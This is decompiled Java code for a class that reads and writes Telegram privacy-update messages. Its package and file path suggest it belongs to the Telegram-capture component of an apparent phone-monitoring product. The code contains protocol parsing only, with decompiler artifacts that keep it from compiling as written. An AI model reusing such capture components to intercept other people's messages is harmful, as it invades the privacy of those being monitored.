package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$TL_updatePrivacy
  extends TLRPC.Update
{
  public static int constructor = -298113238;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    int i = 0;
    String str = null;
    int j = paramAbstractSerializedData.readInt32(paramBoolean);
    Object localObject1 = TLRPC.TL_privacyKeyStatusTimestamp.TLdeserialize(paramAbstractSerializedData, j, paramBoolean);
    this.key = ((TLRPC.TL_privacyKeyStatusTimestamp)localObject1);
    j = paramAbstractSerializedData.readInt32(paramBoolean);
    int k = 481674261;
    Object localObject2;
    if (j != k)
    {
      if (paramBoolean)
      {
        localObject2 = new java/lang/RuntimeException;
        Object[] arrayOfObject = new Object[1];
        localObject1 = Integer.valueOf(j);
        arrayOfObject[0] = localObject1;
        str = String.format("wrong Vector magic, got %x", arrayOfObject);
        ((RuntimeException)localObject2).<init>(str);
        throw ((Throwable)localObject2);
      }
    }
    else {
      j = paramAbstractSerializedData.readInt32(paramBoolean);
    }
    for (;;)
    {
      if (i < j)
      {
        k = paramAbstractSerializedData.readInt32(paramBoolean);
        localObject2 = TLRPC.PrivacyRule.TLdeserialize(paramAbstractSerializedData, k, paramBoolean);
        if (localObject2 != null) {}
      }
      else
      {
        return;
      }
      ArrayList localArrayList = this.rules;
      localArrayList.add(localObject2);
      i += 1;
    }
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    this.key.serializeToStream(paramAbstractSerializedData);
    paramAbstractSerializedData.writeInt32(481674261);
    int j = this.rules.size();
    paramAbstractSerializedData.writeInt32(j);
    i = 0;
    TLRPC.PrivacyRule localPrivacyRule = null;
    for (int k = 0; k < j; k = i)
    {
      localPrivacyRule = (TLRPC.PrivacyRule)this.rules.get(k);
      localPrivacyRule.serializeToStream(paramAbstractSerializedData);
      i = k + 1;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_updatePrivacy.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */